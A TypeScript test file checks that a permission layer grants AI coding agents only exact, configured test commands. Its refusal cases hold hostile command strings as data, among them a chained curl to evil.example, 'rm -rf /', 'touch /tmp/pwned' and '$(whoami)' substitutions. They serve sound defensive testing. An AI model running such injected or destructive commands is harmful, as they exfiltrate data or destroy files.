/**
 * The exec grant derived from `execution.testCommands` (`PLAN-M13.md` P23, `SPEC-QUESTIONS.md` Q230; `13` §13.1 F-TEST-1
 * rule 4, `20` §20.1, `07` §7.2). The properties that matter: a derived pattern is EXACTLY the configured command, it can
 * never be wider than that one command (no `*`, no operator, no expansion), only the layers a step's brief needs are
 * derived, and a value that cannot be granted is reported as unavailable with a remedy instead of being silently dropped
 * or, worse, granted.
 */
import { readdir } from 'node:fs/promises';
import { fileURLToPath } from 'node:url';

import type { ToolGrant } from '@forge/adapter-kit';
import { isExecAllowed } from '@forge/adapter-kit/grants';
import { configSchema } from '@forge/schemas/config';
import { describe, expect, it } from 'vitest';
import type { ZodEnum, ZodRecord } from 'zod';

import {
  AGENT_RUN_LAYERS,
  checkTestCommand,
  deriveTestExec,
  grantWithTestExec,
  NO_DERIVED_TEST_EXEC,
  TEST_COMMAND_LAYERS,
  TEST_LAYERS_BY_BRIEF,
  testLayersForBrief,
  type TestCommandProblem,
} from '../../src/dispatch/test-command-grant.ts';

const BRIEFS_DIR = fileURLToPath(new URL('../../../templates/templates/briefs/', import.meta.url));

describe('the layer list', () => {
  it('is the schema’s own list of execution.testCommands layers (no drift, no missing layer)', () => {
    const record = configSchema.shape.execution.shape.testCommands as ZodRecord<
      ZodEnum<[string, ...string[]]>
    >;
    expect([...TEST_COMMAND_LAYERS].sort()).toEqual([...record.keySchema.options].sort());
  });

  it('the layers whose command becomes an exec pattern are exactly the ones some brief runs', () => {
    expect(AGENT_RUN_LAYERS).toEqual(['unit', 'integration', 'lint', 'typecheck']);
  });
});

describe('checkTestCommand: one plain invocation, or a typed reason and a remedy', () => {
  it.each([
    ['pnpm test', 'pnpm test'],
    ['pnpm run test:unit', 'pnpm run test:unit'],
    ['pytest -q tests/unit', 'pytest -q tests/unit'],
    ['node -e "process.exitCode=1"', 'node -e "process.exitCode=1"'],
    ["node -e 'process.exitCode=0'", "node -e 'process.exitCode=0'"],
    ['./scripts/test.sh --fast', './scripts/test.sh --fast'],
    ['  pnpm test\n', 'pnpm test'],
    ['go test ./...', 'go test ./...'],
  ] as const)('accepts %j as %j', (raw, expected) => {
    // `go test ./...` has no `*`; a `...` is not a wildcard in a grant.
    expect(checkTestCommand(raw)).toEqual({ ok: true, command: expected });
  });

  const refused: readonly (readonly [string, string, TestCommandProblem])[] = [
    ['blank', '', 'blank'],
    ['only whitespace', '  \n ', 'blank'],
    ['two lines', 'pnpm lint\npnpm test', 'multiline'],
    ['a NUL byte', 'pnpm test\0 --x', 'multiline'],
    ['chained with &&', 'pnpm lint && pnpm test', 'operator'],
    ['chained with ;', 'pnpm test; curl https://evil.example/x', 'operator'],
    ['piped', 'pnpm test | tee out.txt', 'operator'],
    ['redirected', 'pnpm test > out.txt', 'operator'],
    ['a substitution', 'pnpm test $(whoami)', 'operator'],
    ['a backtick', 'pnpm test `whoami`', 'operator'],
    ['a trailing wildcard', 'pnpm test *', 'wildcard'],
    ['a wildcard glued to the program', 'pnpm test*', 'wildcard'],
    ['a glob argument', 'vitest run src/**/*.test.ts', 'wildcard'],
    [
      'a wildcard in quotes (Claude Code reads it as a wildcard anyway)',
      "grep -r '*' src",
      'wildcard',
    ],
    ['a variable prefix', 'CI=1 pnpm test', 'env-assignment'],
    ['a variable expansion', 'pnpm test $HOME', 'expansion'],
    ['a home expansion', 'pnpm test ~/x', 'expansion'],
    ['a backslash', 'pnpm test \\', 'expansion'],
    ['a comment', 'pnpm test # then more', 'operator'],
    [
      'a parenthesis (the adapter cannot carry it)',
      'node -e "process.exit(1)"',
      'unsupported-character',
    ],
    ['a comma (the adapter cannot carry it)', 'go test -run A,B', 'unsupported-character'],
    ['a no-break space', 'pnpm\u00a0test', 'unsupported-character'],
    ['a tab', 'pnpm\ttest', 'unsupported-character'],
    ['a line separator', 'pnpm test\u2028x', 'unsupported-character'],
    ['a zero-width space', 'pnpm\u200btest', 'unsupported-character'],
    ['a right-to-left override', 'pnpm test\u202e', 'unsupported-character'],
    ['a soft hyphen', 'pnpm te\u00adst', 'unsupported-character'],
    ['a tag character', 'pnpm test\u{e0041}', 'unsupported-character'],
    ['a question-mark glob', 'cat ?.txt', 'unsupported-character'],
    ['a bracket glob', 'cat [a].txt', 'unsupported-character'],
    ['a backslash inside single quotes', "pytest -k 'a\\b'", 'unsupported-character'],
    ['a network program', 'curl https://example.com', 'not-a-test-command'],
    ['a package install', 'pnpm install', 'not-a-test-command'],
    ['a package runner', 'npx vitest', 'not-a-test-command'],
    ['a destructive git subcommand', 'git push origin main', 'not-a-test-command'],
    ['a quoted program name', '"pnpm" test', 'quoted-program'],
    ['a half-quoted program name', 'p"n"pm test', 'quoted-program'],
    ['an unterminated quote', 'node -e "x', 'malformed'],
    ['a hard-denylisted command', 'rm -rf /', 'denylisted'],
    ['a command over the length limit', `pnpm test ${'a'.repeat(1100)}`, 'too-long'],
  ];

  it.each(refused)('refuses %s with the reason %s', (_name, raw, problem) => {
    const checked = checkTestCommand(raw);
    expect(checked.ok).toBe(false);
    if (checked.ok) return;
    expect(checked.problem).toBe(problem);
    expect(checked.detail.length).toBeGreaterThan(0);
    // A remedy is an action, not a restatement.
    expect(checked.remedy).toMatch(/^[A-Z]/);
    expect(checked.remedy.length).toBeGreaterThan(20);
  });
});

describe('deriveTestExec: exactly the configured commands of the layers asked for', () => {
  const configured = {
    unit: 'pnpm test',
    integration: 'pnpm run test:integration',
    lint: 'pnpm lint',
    typecheck: 'pnpm typecheck',
    e2e: 'pnpm e2e',
    smoke: 'pnpm smoke',
  };

  it('derives one exact pattern per asked layer, in the order asked, and nothing for a layer not asked', () => {
    const derived = deriveTestExec(configured, ['typecheck', 'unit']);
    expect(derived.patterns).toEqual(['pnpm typecheck', 'pnpm test']);
    expect(derived.granted).toEqual([
      { layer: 'typecheck', command: 'pnpm typecheck' },
      { layer: 'unit', command: 'pnpm test' },
    ]);
    expect(derived.unavailable).toEqual([]);
    expect(derived.patterns).not.toContain('pnpm e2e');
    expect(derived.patterns).not.toContain('pnpm smoke');
  });

  it('a layer nobody asked for is never derived, however it is configured', () => {
    expect(deriveTestExec(configured, []).patterns).toEqual([]);
    expect(deriveTestExec(configured, [])).toBe(NO_DERIVED_TEST_EXEC);
  });

  it('a layer that is not set is unavailable with the key it needs and the command that sets it, never a pattern', () => {
    const derived = deriveTestExec({ unit: 'pnpm test' }, ['unit', 'integration']);
    expect(derived.patterns).toEqual(['pnpm test']);
    expect(derived.unavailable).toHaveLength(1);
    expect(derived.unavailable[0]).toMatchObject({ layer: 'integration', reason: 'unset' });
    expect(derived.unavailable[0]?.detail).toContain('execution.testCommands.integration');
    expect(derived.unavailable[0]?.remedy).toContain(
      'forge config set execution.testCommands.integration',
    );
  });

  it('nothing configured (or no config at all) derives nothing and reports every asked layer unavailable', () => {
    for (const commands of [{}, undefined]) {
      const derived = deriveTestExec(commands, ['unit', 'lint']);
      expect(derived.patterns).toEqual([]);
      expect(derived.unavailable.map((entry) => entry.layer)).toEqual(['unit', 'lint']);
    }
  });

  it('two layers configured with the same command grant it once', () => {
    const derived = deriveTestExec({ unit: 'pnpm test', integration: 'pnpm test' }, [
      'unit',
      'integration',
    ]);
    expect(derived.patterns).toEqual(['pnpm test']);
    expect(derived.granted.map((entry) => entry.layer)).toEqual(['unit', 'integration']);
  });

  it('a value that would widen the grant is refused, reported with its reason and remedy, and the rest still derive', () => {
    const hostile = {
      unit: 'pnpm test; touch /tmp/pwned',
      integration: 'pnpm test*',
      lint: 'pnpm lint',
      typecheck: 'pnpm typecheck && rm -rf .',
    };
    const derived = deriveTestExec(hostile, ['unit', 'integration', 'lint', 'typecheck']);
    expect(derived.patterns).toEqual(['pnpm lint']);
    expect(derived.unavailable.map((entry) => [entry.layer, entry.reason])).toEqual([
      ['unit', 'operator'],
      ['integration', 'wildcard'],
      ['typecheck', 'operator'],
    ]);
    for (const entry of derived.unavailable) {
      expect(entry.remedy.length).toBeGreaterThan(20);
      expect(entry.detail).toContain(`execution.testCommands.${entry.layer}`);
    }
  });

  it('whatever the configuration holds, no derived pattern contains a wildcard or a shell operator', () => {
    const corpus = [
      '*',
      'pnpm test *',
      'pnpm test*',
      '* test',
      'pnpm test;x',
      'pnpm test&&x',
      'pnpm test||x',
      'pnpm test|x',
      'pnpm test>x',
      'pnpm test<x',
      'pnpm test\nrm x',
      'pnpm test\rrm x',
      'pnpm test`x`',
      'pnpm test$(x)',
      'pnpm test\0',
      'A=1 pnpm test',
      '',
      ' ',
      'pnpm test',
      'node -e "1"',
    ];
    for (const value of corpus) {
      const derived = deriveTestExec({ unit: value }, ['unit']);
      for (const pattern of derived.patterns) {
        expect(pattern, JSON.stringify(value)).not.toMatch(/[*;&|`<>\r\n\0]|\$\(/);
        expect(pattern.startsWith('=')).toBe(false);
      }
    }
  });

  it('a derived pattern matches its own command exactly, and not one character more or less', () => {
    for (const command of ['pnpm test', 'pnpm run test:unit', 'node -e "process.exitCode=1"']) {
      const derived = deriveTestExec({ unit: command }, ['unit']);
      const grant: ToolGrant = {
        read: true,
        write: false,
        exec: [...derived.patterns],
        network: 'none',
      };
      expect(isExecAllowed(grant, command)).toBe(true);
      expect(isExecAllowed(grant, `${command} --watch`)).toBe(false);
      expect(isExecAllowed(grant, `${command} `)).toBe(false);
      expect(isExecAllowed(grant, ` ${command}`)).toBe(false);
      expect(isExecAllowed(grant, `${command}; rm -rf x`)).toBe(false);
      expect(isExecAllowed(grant, command.slice(0, -1))).toBe(false);
      expect(isExecAllowed(grant, command.replace(' ', '  '))).toBe(false);
      expect(isExecAllowed(grant, command.toUpperCase())).toBe(command.toUpperCase() === command);
    }
  });
});

describe('grantWithTestExec: the agent’s own patterns plus the derived ones, and never more than that', () => {
  const derived = deriveTestExec({ unit: 'pnpm test', lint: 'pnpm lint' }, ['lint', 'unit']);

  it('keeps every pattern the agent declares, adds the derived ones after them, and changes nothing else', () => {
    const grant: ToolGrant = {
      read: true,
      write: true,
      exec: ['git *', 'ls*'],
      network: 'allowlist',
      allowlistHosts: ['example.com'],
    };
    expect(grantWithTestExec(grant, derived)).toEqual({
      ...grant,
      exec: ['git *', 'ls*', 'pnpm lint', 'pnpm test'],
    });
  });

  it('a pattern the agent already holds is not repeated', () => {
    const grant: ToolGrant = { read: true, write: false, exec: ['pnpm test'], network: 'none' };
    expect(grantWithTestExec(grant, derived).exec).toEqual(['pnpm test', 'pnpm lint']);
  });

  it('an agent whose grant allows no commands (declared none, read-only, tainted) is never handed one', () => {
    const grant: ToolGrant = { read: true, write: false, exec: false, network: 'none' };
    expect(grantWithTestExec(grant, derived)).toBe(grant);
    expect(grantWithTestExec(grant, derived).exec).toBe(false);
  });

  it('nothing derived returns the grant itself', () => {
    const grant: ToolGrant = { read: true, write: false, exec: ['git *'], network: 'none' };
    expect(grantWithTestExec(grant, NO_DERIVED_TEST_EXEC)).toBe(grant);
  });
});

describe('the layers each brief needs', () => {
  it('names the layers of the briefs that run tests, and nothing for one that does not', () => {
    expect(testLayersForBrief('implement-story')).toEqual([
      'typecheck',
      'lint',
      'unit',
      'integration',
    ]);
    expect(testLayersForBrief('write-failing-tests')).toEqual(['unit', 'integration']);
    expect(testLayersForBrief('run-rca-framework')).toEqual(['unit', 'integration']);
    expect(testLayersForBrief('debug-isolate')).toEqual(['unit', 'integration']);
    for (const none of [
      'plan-story',
      'write-prd',
      'migration-expand',
      'verify-nfrs',
      'write-contract-tests',
    ]) {
      expect(testLayersForBrief(none), none).toEqual([]);
    }
    expect(testLayersForBrief(undefined)).toEqual([]);
  });

  it('a key that is an Object.prototype member is not a brief', () => {
    for (const key of ['constructor', 'toString', '__proto__', 'hasOwnProperty']) {
      expect(testLayersForBrief(key), key).toEqual([]);
    }
  });

  it('no brief runs a layer that needs an environment a lane does not have (e2e, nfr, smoke, contract)', () => {
    for (const [brief, layers] of Object.entries(TEST_LAYERS_BY_BRIEF)) {
      for (const layer of layers) {
        expect(['e2e', 'nfr', 'smoke', 'contract'], `${brief}: ${layer}`).not.toContain(layer);
      }
    }
  });

  it('every brief the table names is a shipped brief (or the debug loop’s own REPRODUCE key)', async () => {
    const shipped = new Set((await readdir(BRIEFS_DIR)).map((name) => name.replace(/\.md$/, '')));
    for (const key of Object.keys(TEST_LAYERS_BY_BRIEF)) {
      if (key === 'debug-isolate') continue;
      expect(shipped.has(key), `${key} is not a file in packages/templates/templates/briefs`).toBe(
        true,
      );
    }
  });
});
